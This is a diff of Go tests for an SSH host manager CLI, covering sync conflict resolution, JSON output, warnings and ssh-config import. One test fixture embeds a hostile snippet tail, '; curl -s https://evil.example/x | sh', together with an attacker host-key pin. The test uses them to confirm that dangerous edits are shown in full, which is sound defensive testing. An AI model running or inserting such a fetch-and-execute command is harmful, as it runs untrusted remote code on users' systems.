@@ -2,6 +2,9 @@ package cli_test
 
 import (
 	"encoding/json"
+	"os"
+	"path/filepath"
+	"strconv"
 	"strings"
 	"testing"
 	"time"
@@ -320,6 +323,44 @@ func TestMarksInLsAndInfo(t *testing.T) {
 	}
 }
 
+// hop info --json, an object, says when the vault last synced; hop ls
+// --json stays the array it was, without it, and its help says where to
+// look instead.
+func TestSyncedAtInInfoNotLs(t *testing.T) {
+	f := newFakeDaemon(t)
+	hosts := lsFixture(f, nil)
+	h := hosts[0]
+	f.reply(daemon.OpResolve, daemon.ResolveResult{
+		Result: &resolve.Result{Target: "web-1", Status: resolve.StatusMatched, HostID: h.ItemID.String(), HostName: h.Name}, Host: &h, SSHAlias: "web-1",
+	})
+	code, out, _ := f.hop(t, "info", "web-1", "--json")
+	var info cli.InfoView
+	decodeJSON(t, out, &info)
+	if code != 0 || info.SyncedAt == nil || !info.SyncedAt.Equal(*ago(f, time.Minute)) || info.Name != "web-1" {
+		t.Errorf("info --json: exit %d: %s", code, out)
+	}
+	_, out, _ = f.hop(t, "ls", "--json")
+	var views []map[string]any
+	decodeJSON(t, out, &views)
+	for _, v := range views {
+		if _, ok := v["synced_at"]; ok {
+			t.Errorf("ls --json has synced_at: %s", out)
+		}
+	}
+	if code, _, errOut := f.hop(t, "ls", "-h"); code != 0 || !strings.Contains(errOut, "hop info --json") || !strings.Contains(errOut, "synced_at") {
+		t.Errorf("ls -h: exit %d, %q", code, errOut)
+	}
+
+	// No sync yet, or a local-only vault: present, and null.
+	f.reply(daemon.OpList, daemon.ListResult{Hosts: hosts, Keys: []daemon.KeyInfo{}, SSH: map[string]daemon.HostSSH{}})
+	_, out, _ = f.hop(t, "info", "web-1", "--json")
+	var m map[string]any
+	decodeJSON(t, out, &m)
+	if v, ok := m["synced_at"]; !ok || v != nil {
+		t.Errorf("info --json without a sync: %s", out)
+	}
+}
+
 func TestLsWithoutMarksHasNoSyncColumn(t *testing.T) {
 	f := newFakeDaemon(t)
 	lsFixture(f, nil)
@@ -356,9 +397,11 @@ const (
 	editTk = "eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee"
 )
 
+// hostJSON is a host's plaintext as the daemon sends it: item_version is a
+// decimal string, as in the protocol.
 func hostJSON(version int, addr, desc string) json.RawMessage {
 	b, _ := json.Marshal(map[string]any{
-		"v": 1, "item_id": model.ID{1}.String(), "type": "host", "item_version": version,
+		"v": 1, "item_id": model.ID{1}.String(), "type": "host", "item_version": strconv.Itoa(version),
 		"name": "web-1", "aliases": []string{}, "addresses": []string{addr}, "port": 22, "user": "deploy",
 		"tags": []string{}, "description": desc, "route": "auto", "host_keys": []string{}, "agent_access": "allow",
 	})
@@ -634,6 +677,177 @@ func TestSyncResolveEdit(t *testing.T) {
 	}
 }
 
+// --edit starts from the server's version of a live item (merge.EditStart):
+// what another device changed there and --set does not name is kept, and
+// only the named fields change.
+func TestSyncResolveEditStartsFromTheServersVersion(t *testing.T) {
+	f := newFakeDaemon(t)
+	held := heldHost(token1)
+	var cur map[string]any
+	json.Unmarshal(held.Held[0].Current, &cur)
+	cur["user"], cur["tags"] = "ops", []string{"from-the-server"}
+	held.Held[0].Current, _ = json.Marshal(cur)
+	f.reply(daemon.OpSyncHeld, held)
+	f.on(daemon.OpSyncResolve, func(raw json.RawMessage) (any, error) {
+		var p daemon.SyncResolveParams
+		json.Unmarshal(raw, &p)
+		return daemon.SyncResolveResult{Proposal: &daemon.Proposal{N: 7, Choice: daemon.ChoiceEdit, Action: merge.ActionPut, ItemID: model.ID{1}.String(),
+			Type: model.TypeHost, Want: p.Edited, Confirm: editTk}}, nil
+	})
+	if code, _, errOut := f.hop(t, "sync", "resolve", "7", "--edit", "--set", "port=2222"); code != 255 || !strings.Contains(errOut, "needs --confirm") {
+		t.Fatalf("exit %d: %s", code, errOut)
+	}
+	calls := f.called(daemon.OpSyncResolve)
+	if len(calls) != 1 || !resolveParams(t, calls[0]).Propose {
+		t.Fatalf("calls = %s", calls)
+	}
+	var edited map[string]any
+	json.Unmarshal(resolveParams(t, calls[0]).Edited, &edited)
+	want := map[string]any{"user": "ops", "item_version": "4", "description": "theirs " + hostile, "port": float64(2222)}
+	for k, v := range want {
+		if edited[k] != v {
+			t.Errorf("edited %s = %v, want %v (the server's, or the --set)", k, edited[k], v)
+		}
+	}
+	if a, _ := edited["addresses"].([]any); len(a) != 1 || a[0] != "10.0.0.3" {
+		t.Errorf("edited addresses = %v, want the server's [10.0.0.3]", edited["addresses"])
+	}
+	if tg, _ := edited["tags"].([]any); len(tg) != 1 || tg[0] != "from-the-server" {
+		t.Errorf("edited tags = %v, want the server's", edited["tags"])
+	}
+
+	// A put the server no longer has starts from this device's version.
+	held.Held[0].Hold.Cause, held.Held[0].Current = merge.CauseNotLive, json.RawMessage("null")
+	f.reply(daemon.OpSyncHeld, held)
+	f.reset()
+	f.hop(t, "sync", "resolve", "7", "--edit", "--set", "port=2222")
+	calls = f.called(daemon.OpSyncResolve)
+	if len(calls) != 1 {
+		t.Fatalf("not live: calls = %s", calls)
+	}
+	edited = nil
+	json.Unmarshal(resolveParams(t, calls[0]).Edited, &edited)
+	if a, _ := edited["addresses"].([]any); len(a) != 1 || a[0] != "10.0.0.2" || edited["user"] != "deploy" {
+		t.Errorf("not live: edited = %v, want this device's version", edited)
+	}
+}
+
+// Take theirs asks only on a terminal session. With --json, or stdout
+// redirected, it needs --yes even when stdin is a terminal that could
+// answer, and it reads nothing from stdin.
+func TestSyncResolveTakeTheirsNeverPromptsWhenNotInteractive(t *testing.T) {
+	for _, tt := range []struct {
+		name string
+		args []string
+		env  func(*cli.Env)
+	}{
+		{"json with a terminal", []string{"--json"}, func(e *cli.Env) { e.StdinTTY, e.StdoutTTY = true, true }},
+		{"stdout redirected", nil, func(e *cli.Env) { e.StdinTTY, e.StdoutTTY = true, false }},
+		{"stdin not a terminal", nil, func(e *cli.Env) { e.StdinTTY, e.StdoutTTY = false, true }},
+	} {
+		t.Run(tt.name, func(t *testing.T) {
+			f := newFakeDaemon(t)
+			f.reply(daemon.OpSyncHeld, heldHost(token1))
+			f.reply(daemon.OpSyncResolve, daemon.SyncResolveResult{Status: &daemon.SyncStatusResult{State: daemon.SyncOnline}})
+			f.stdin = "y\n"
+			args := append([]string{"sync", "resolve", "7", "--take-theirs"}, tt.args...)
+			code, _, errOut := f.hopWith(t, tt.env, args...)
+			if code != 255 || !strings.Contains(errOut, "pass --yes") {
+				t.Errorf("exit %d, %q", code, errOut)
+			}
+			if strings.Contains(errOut, "[y/N]") {
+				t.Errorf("it prompted: %q", errOut)
+			}
+			if n := len(f.called(daemon.OpSyncResolve)); n != 0 {
+				t.Errorf("sync.resolve called %d times without --yes", n)
+			}
+			code, _, errOut = f.hopWith(t, tt.env, append(args, "--yes")...)
+			if code != 0 || len(f.called(daemon.OpSyncResolve)) != 1 {
+				t.Errorf("with --yes: exit %d, %q", code, errOut)
+			}
+		})
+	}
+	// On a terminal session it asks.
+	f := newFakeDaemon(t)
+	f.reply(daemon.OpSyncHeld, heldHost(token1))
+	f.reply(daemon.OpSyncResolve, daemon.SyncResolveResult{Status: &daemon.SyncStatusResult{State: daemon.SyncOnline}})
+	f.tty, f.stdin = true, "y\n"
+	if code, _, errOut := f.hop(t, "sync", "resolve", "7", "--take-theirs"); code != 0 || !strings.Contains(errOut, "[y/N]") {
+		t.Errorf("terminal: exit %d, %q", code, errOut)
+	}
+}
+
+// What keep-mine or edit would write is shown whole: a long snippet
+// command with a dangerous tail, and a host-key list whose extra pin
+// comes after 200 characters, are never cut, and control characters in
+// them are shown as escapes. Secrets stay out.
+func TestSyncResolveShowsProtectedFieldsInFull(t *testing.T) {
+	tail := "; curl -s https://evil.example/x | sh\x1b[2J"
+	command := "echo " + strings.Repeat("a", 240) + tail
+	snippet := func(cmd string) json.RawMessage {
+		b, _ := json.Marshal(map[string]any{"v": 1, "item_id": model.ID{6}.String(), "type": "snippet", "item_version": "2",
+			"name": "deploy", "command": cmd, "params": []string{}, "description": ""})
+		return b
+	}
+	pinA := "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI" + strings.Repeat("A", 200) + " a@example"
+	pinB := "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEXTRAPINBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB attacker"
+	host := func(pins []string) json.RawMessage {
+		var m map[string]any
+		json.Unmarshal(hostJSON(4, "10.0.0.3", ""), &m)
+		m["host_keys"] = pins
+		b, _ := json.Marshal(m)
+		return b
+	}
+	f := newFakeDaemon(t)
+	f.reply(daemon.OpSyncHeld, daemon.SyncHeldResult{Held: []daemon.HeldChange{
+		{
+			N: 3, Action: merge.ActionPut, ItemID: model.ID{6}.String(), Type: model.TypeSnippet,
+			Seen: snippet("echo hi"), Want: snippet(command), Current: snippet("echo theirs"),
+			Hold:    &store.HoldInfo{Cause: merge.CauseGuardedConflict, Local: []string{"command"}, Remote: []string{"command"}},
+			Choices: []string{daemon.ChoiceKeepMine, daemon.ChoiceTakeTheirs},
+			KeepMine: &daemon.Proposal{N: 3, Choice: daemon.ChoiceKeepMine, Action: merge.ActionPut, ItemID: model.ID{6}.String(), Type: model.TypeSnippet,
+				Seen: snippet("echo theirs"), Want: snippet(command), Confirm: token1},
+		},
+		{
+			N: 4, Action: merge.ActionPut, ItemID: model.ID{1}.String(), Type: model.TypeHost,
+			Seen: host([]string{pinA}), Want: host([]string{pinA, pinB}), Current: host([]string{}),
+			Hold:    &store.HoldInfo{Cause: merge.CauseGuardedConflict, Local: []string{"host_keys"}, Remote: []string{"host_keys"}},
+			Choices: []string{daemon.ChoiceKeepMine, daemon.ChoiceTakeTheirs},
+			KeepMine: &daemon.Proposal{N: 4, Choice: daemon.ChoiceKeepMine, Action: merge.ActionPut, ItemID: model.ID{1}.String(), Type: model.TypeHost,
+				Seen: host([]string{}), Want: host([]string{pinA, pinB}), Confirm: token2},
+		},
+	}})
+	escapedTail := `; curl -s https://evil.example/x | sh\x1b[2J`
+	check := func(what, out string) {
+		t.Helper()
+		assertNoForgery(t, what, out)
+		if !strings.Contains(out, "echo "+strings.Repeat("a", 240)+escapedTail) {
+			t.Errorf("%s: the snippet command is not shown whole:\n%s", what, out)
+		}
+		if !strings.Contains(out, `["`+pinA+`","`+pinB+`"]`) {
+			t.Errorf("%s: the host keys are not shown whole:\n%s", what, out)
+		}
+		if strings.Contains(out, "...") {
+			t.Errorf("%s: something was cut:\n%s", what, out)
+		}
+	}
+	// The listing, and each proposal printed without a token.
+	_, out, _ := f.hop(t, "sync", "resolve")
+	check("listing", out)
+	_, out3, _ := f.hop(t, "sync", "resolve", "3", "--keep-mine")
+	_, out4, _ := f.hop(t, "sync", "resolve", "4", "--keep-mine")
+	check("proposals", out3+out4)
+	// The terminal confirmation shows the same before it asks.
+	f.tty, f.stdin = true, "n\n"
+	_, out3, _ = f.hop(t, "sync", "resolve", "3", "--keep-mine")
+	f.tty, f.stdin = true, "n\n"
+	_, out4, _ = f.hop(t, "sync", "resolve", "4", "--keep-mine")
+	check("confirmation", out3+out4)
+	if n := len(f.called(daemon.OpSyncResolve)); n != 0 {
+		t.Errorf("sync.resolve called %d times", n)
+	}
+}
+
 func TestSyncResolveKeepMineRefused(t *testing.T) {
 	f := newFakeDaemon(t)
 	held := heldHost(token1)
@@ -651,7 +865,7 @@ func TestSyncResolveKeepMineRefused(t *testing.T) {
 func TestSyncResolveNeverPrintsSecrets(t *testing.T) {
 	f := newFakeDaemon(t)
 	key := func(name string) json.RawMessage {
-		b, _ := json.Marshal(map[string]any{"v": 1, "item_id": model.ID{5}.String(), "type": "key", "item_version": 1,
+		b, _ := json.Marshal(map[string]any{"v": 1, "item_id": model.ID{5}.String(), "type": "key", "item_version": "1",
 			"name": name, "key_type": "ssh-ed25519", "public_key": "ssh-ed25519 AAAA", "private_key": "-----BEGIN SECRET-----"})
 		return b
 	}
@@ -773,48 +987,73 @@ func TestConfigStaleRefusesToConnect(t *testing.T) {
 const notWritten = "saved, but the ssh config could not be updated (permission denied " + hostile + "); the daemon tries again"
 
 func TestConfigNotWrittenOnUnlockIsAWarning(t *testing.T) {
-	f := newFakeDaemon(t)
-	f.fail(daemon.OpUnlock, daemon.CodeConfigNotWritten, "vault unlocked and keys loaded; "+notWritten)
-	f.reply(daemon.OpStatus, daemon.StatusResult{Vault: &store.Info{Warnings: []string{"1 stale device " + hostile}}})
-	f.reply(daemon.OpKit, json.RawMessage(`{"kit":{}}`))
-	code, out, errOut := f.hop(t, "unlock")
-	if code != 0 {
-		t.Fatalf("exit %d: %s", code, errOut)
-	}
-	if out != "vault unlocked\n" {
-		t.Errorf("stdout %q", out)
-	}
-	for _, want := range []string{"hop: warning: vault unlocked and keys loaded", "hop: warning: 1 stale device", "Emergency Kit is not confirmed"} {
-		if !strings.Contains(errOut, want) {
-			t.Errorf("stderr lacks %q:\n%s", want, errOut)
-		}
-	}
-	assertNoForgery(t, "unlock", errOut)
-	if got := len(lines(errOut)); got != 3 {
-		t.Errorf("%d stderr lines, want 3:\n%s", got, errOut)
-	}
+	// The daemon's answer, and the error an older daemon gave instead.
+	for _, form := range []string{"warning", "older error"} {
+		t.Run(form, func(t *testing.T) {
+			f := newFakeDaemon(t)
+			msg := "vault unlocked and keys loaded; " + notWritten
+			if form == "warning" {
+				f.reply(daemon.OpUnlock, warned{warning: msg})
+			} else {
+				f.fail(daemon.OpUnlock, daemon.CodeConfigNotWritten, msg)
+			}
+			f.reply(daemon.OpStatus, daemon.StatusResult{Vault: &store.Info{Warnings: []string{"1 stale device " + hostile}}})
+			f.reply(daemon.OpKit, json.RawMessage(`{"kit":{}}`))
+			code, out, errOut := f.hop(t, "unlock")
+			if code != 0 {
+				t.Fatalf("exit %d: %s", code, errOut)
+			}
+			if out != "vault unlocked\n" {
+				t.Errorf("stdout %q", out)
+			}
+			for _, want := range []string{"hop: warning: vault unlocked and keys loaded", "hop: warning: 1 stale device", "Emergency Kit is not confirmed"} {
+				if !strings.Contains(errOut, want) {
+					t.Errorf("stderr lacks %q:\n%s", want, errOut)
+				}
+			}
+			assertNoForgery(t, "unlock", errOut)
+			if got := len(lines(errOut)); got != 3 {
+				t.Errorf("%d stderr lines, want 3:\n%s", got, errOut)
+			}
 
-	// Any other refusal is still a failure.
-	f.fail(daemon.OpUnlock, daemon.CodeLocked, "the device key can't be read")
-	if code, _, _ := f.hop(t, "unlock"); code != 255 {
-		t.Errorf("a failed unlock exits %d", code)
+			// Any other refusal is still a failure.
+			f.fail(daemon.OpUnlock, daemon.CodeLocked, "the device key can't be read")
+			if code, _, _ := f.hop(t, "unlock"); code != 255 {
+				t.Errorf("a failed unlock exits %d", code)
+			}
+		})
+	}
+}
+
+// echoHost answers put_host as the daemon does while the ssh config can't
+// be written: the host as saved (a new one gets id), with a warning.
+func echoHost(t *testing.T, id model.ID) func(json.RawMessage) (any, error) {
+	return func(raw json.RawMessage) (any, error) {
+		var p daemon.PutHostParams
+		if err := json.Unmarshal(raw, &p); err != nil {
+			t.Error(err)
+		}
+		if p.Host.ItemID.IsZero() {
+			p.Host.ItemID = id
+		}
+		p.Host.ItemVersion++
+		return warned{result: p.Host, warning: notWritten}, nil
 	}
 }
 
 func TestConfigNotWrittenOnChangesIsAWarning(t *testing.T) {
 	f := newFakeDaemon(t)
 	web1 := model.Host{Header: model.Header{ItemID: model.ID{1}}, Name: "web-1", Addresses: []string{"10.0.0.1"}, Port: 22}
-	added := model.Host{Header: model.Header{ItemID: model.ID{4}}, Name: "new-1", Addresses: []string{"new-1"}, Port: 22}
 	f.reply(daemon.OpList, daemon.ListResult{
-		Hosts: []model.Host{web1, added}, SSH: map[string]daemon.HostSSH{},
+		Hosts: []model.Host{web1}, SSH: map[string]daemon.HostSSH{},
 		Keys: []daemon.KeyInfo{{ID: model.ID{8}.String(), Name: "mykey", KeyType: "ssh-ed25519", Fingerprint: "SHA256:k"}},
 	})
 	f.reply(daemon.OpResolve, daemon.ResolveResult{
 		Result: &resolve.Result{Target: "web-1", Status: resolve.StatusMatched, HostID: web1.ItemID.String(), HostName: "web-1"}, Host: &web1,
 	})
-	for _, op := range []string{daemon.OpPutHost, daemon.OpPutKey, daemon.OpDelete} {
-		f.fail(op, daemon.CodeConfigNotWritten, notWritten)
-	}
+	f.on(daemon.OpPutHost, echoHost(t, model.ID{4}))
+	f.reply(daemon.OpPutKey, warned{result: daemon.KeyInfo{ID: model.ID{8}.String(), Name: "mykey", KeyType: "ssh-ed25519", Fingerprint: "SHA256:k"}, warning: notWritten})
+	f.reply(daemon.OpDelete, warned{warning: notWritten})
 	keyPath := f.base + "/id_test"
 	writeKey(t, keyPath, "")
 
@@ -844,14 +1083,15 @@ func TestConfigNotWrittenOnChangesIsAWarning(t *testing.T) {
 	}
 
 	// --json keeps stdout's shape and puts the warning on stderr as JSON.
+	// The host is the one in the daemon's answer: hop ls does not have it.
 	code, out, errOut := f.hop(t, "add", "new-1", "--json")
 	if code != 0 {
 		t.Fatalf("add --json: exit %d: %s", code, errOut)
 	}
 	var v cli.HostView
 	decodeJSON(t, out, &v)
-	if v.ID != added.ItemID.String() || v.Name != "new-1" {
-		t.Errorf("add --json read back %+v", v)
+	if v.ID != (model.ID{4}).String() || v.Name != "new-1" {
+		t.Errorf("add --json printed %+v", v)
 	}
 	var w map[string]string
 	decodeJSON(t, strings.TrimSpace(errOut), &w)
@@ -863,5 +1103,146 @@ func TestConfigNotWrittenOnChangesIsAWarning(t *testing.T) {
 	f.fail(daemon.OpPutHost, daemon.CodeInvalid, "a host needs at least one address")
 	if code, _, _ := f.hop(t, "add", "new-2"); code != 255 {
 		t.Errorf("a refused add exits %d", code)
+	}
+}
+
+// A daemon from before warnings answered config_not_written as an error,
+// with no result. A delete took effect and is a warning; a put whose
+// answer has no ID fails, since nothing can refer to the item it saved.
+func TestConfigNotWrittenWithoutAResult(t *testing.T) {
+	f := newFakeDaemon(t)
+	web1 := model.Host{Header: model.Header{ItemID: model.ID{1}}, Name: "web-1", Addresses: []string{"10.0.0.1"}, Port: 22}
+	f.reply(daemon.OpList, daemon.ListResult{Hosts: []model.Host{web1}, SSH: map[string]daemon.HostSSH{},
+		Keys: []daemon.KeyInfo{{ID: model.ID{8}.String(), Name: "mykey", KeyType: "ssh-ed25519", Fingerprint: "SHA256:k"}}})
+	f.reply(daemon.OpResolve, daemon.ResolveResult{
+		Result: &resolve.Result{Target: "web-1", Status: resolve.StatusMatched, HostID: web1.ItemID.String(), HostName: "web-1"}, Host: &web1,
+	})
+	for _, op := range []string{daemon.OpPutHost, daemon.OpPutKey, daemon.OpDelete} {
+		f.fail(op, daemon.CodeConfigNotWritten, notWritten)
+	}
+	keyPath := f.base + "/id_test"
+	writeKey(t, keyPath, "")
+	for _, args := range [][]string{{"rm", "web-1", "--yes"}, {"key", "rm", "mykey", "--yes"}} {
+		if code, _, errOut := f.hop(t, args...); code != 0 || !strings.Contains(errOut, "hop: warning: saved, but") {
+			t.Errorf("%q: exit %d, %q", args, code, errOut)
+		}
+	}
+	for _, args := range [][]string{{"add", "new-1"}, {"key", "add", keyPath, "--name", "k2"}} {
+		code, out, errOut := f.hop(t, args...)
+		if code != 255 || !strings.Contains(errOut, "its ID is unknown") || strings.Contains(out, "added") {
+			t.Errorf("%q: exit %d, %q %q", args, code, out, errOut)
+		}
+	}
+	// A success with a warning and no result is the same.
+	f.reply(daemon.OpPutHost, warned{warning: notWritten})
+	if code, _, errOut := f.hop(t, "add", "new-1"); code != 255 || !strings.Contains(errOut, "its ID is unknown") {
+		t.Errorf("a warning with no host: exit %d, %q", code, errOut)
+	}
+}
+
+// importJumpConfig is an ssh config whose second host jumps through the
+// first.
+func importJumpConfig(t *testing.T, f *fakeDaemon) func(*cli.Env) {
+	t.Helper()
+	requireSSH(t)
+	dir := filepath.Join(f.home, ".ssh")
+	if err := os.MkdirAll(dir, 0o700); err != nil {
+		t.Fatal(err)
+	}
+	cfg := "Host bastion\n  HostName 192.0.2.1\n\nHost inner\n  HostName 10.0.0.5\n  ProxyJump bastion\n"
+	if err := os.WriteFile(filepath.Join(dir, "config"), []byte(cfg), 0o600); err != nil {
+		t.Fatal(err)
+	}
+	// hop ls never shows what the import saved, as when reading it back
+	// fails or races another change.
+	f.reply(daemon.OpList, daemon.ListResult{Hosts: []model.Host{}, Keys: []daemon.KeyInfo{}, SSH: map[string]daemon.HostSSH{}})
+	return func(env *cli.Env) {
+		env.PasswdHome = func() (string, error) { return f.home, nil }
+		env.SSHProbeEnv = passwdShimEnv()
+	}
+}
+
+func putHosts(t *testing.T, f *fakeDaemon) []model.Host {
+	t.Helper()
+	var out []model.Host
+	for _, raw := range f.called(daemon.OpPutHost) {
+		var p daemon.PutHostParams
+		if err := json.Unmarshal(raw, &p); err != nil {
+			t.Fatal(err)
+		}
+		out = append(out, p.Host)
+	}
+	return out
+}
+
+// An import whose saves succeed while the ssh config can't be written:
+// the host that jumps through bastion gets bastion's ID from the daemon's
+// answer.
+func TestImportJumpsThroughTheHostTheDaemonSaved(t *testing.T) {
+	f := newFakeDaemon(t)
+	adjust := importJumpConfig(t, f)
+	bastionID := model.ID{0x42}
+	f.on(daemon.OpPutHost, func(raw json.RawMessage) (any, error) {
+		id := bastionID
+		if len(f.called(daemon.OpPutHost)) > 1 {
+			id = model.ID{0x43}
+		}
+		return echoHost(t, id)(raw)
+	})
+	code, out, errOut := f.hopWith(t, adjust, "import", "ssh-config", "--yes", "--json")
+	if code != 0 {
+		t.Fatalf("exit %d: %s", code, errOut)
+	}
+	var rep cli.ImportReport
+	decodeJSON(t, out, &rep)
+	for _, en := range rep.Entries {
+		if en.Status != "imported" {
+			t.Errorf("entry %+v", en)
+		}
+	}
+	hosts := putHosts(t, f)
+	if len(hosts) != 2 || hosts[0].Name != "bastion" || hosts[1].Name != "inner" {
+		t.Fatalf("put_host calls: %+v", hosts)
+	}
+	if hosts[1].JumpHostID != bastionID {
+		t.Errorf("inner was saved with jump host %v, want bastion's %v", hosts[1].JumpHostID, bastionID)
+	}
+	if !strings.Contains(errOut, `"warning"`) {
+		t.Errorf("no warning on stderr: %q", errOut)
+	}
+}
+
+// When the daemon's answer to bastion's save names no host, bastion's ID
+// is unknown, so inner is not saved at all: never without its jump.
+func TestImportStopsWhenTheJumpHostsIDIsUnknown(t *testing.T) {
+	for _, form := range []string{"warning without a host", "older error"} {
+		t.Run(form, func(t *testing.T) {
+			f := newFakeDaemon(t)
+			adjust := importJumpConfig(t, f)
+			if form == "older error" {
+				f.fail(daemon.OpPutHost, daemon.CodeConfigNotWritten, notWritten)
+			} else {
+				f.reply(daemon.OpPutHost, warned{warning: notWritten})
+			}
+			code, out, errOut := f.hopWith(t, adjust, "import", "ssh-config", "--yes", "--json")
+			if code != 0 {
+				t.Fatalf("exit %d: %s", code, errOut)
+			}
+			var rep cli.ImportReport
+			decodeJSON(t, out, &rep)
+			status := map[string]cli.ImportEntry{}
+			for _, en := range rep.Entries {
+				status[en.Name] = en
+			}
+			if b := status["bastion"]; b.Status != "failed" || !strings.Contains(b.Reason, "ID is unknown") {
+				t.Errorf("bastion: %+v", b)
+			}
+			if in := status["inner"]; in.Status != "skipped" || !strings.Contains(in.Reason, "was not saved") {
+				t.Errorf("inner: %+v", in)
+			}
+			if hosts := putHosts(t, f); len(hosts) != 1 || hosts[0].Name != "bastion" {
+				t.Errorf("put_host calls: %+v", hosts)
+			}
+		})
 	}
 }
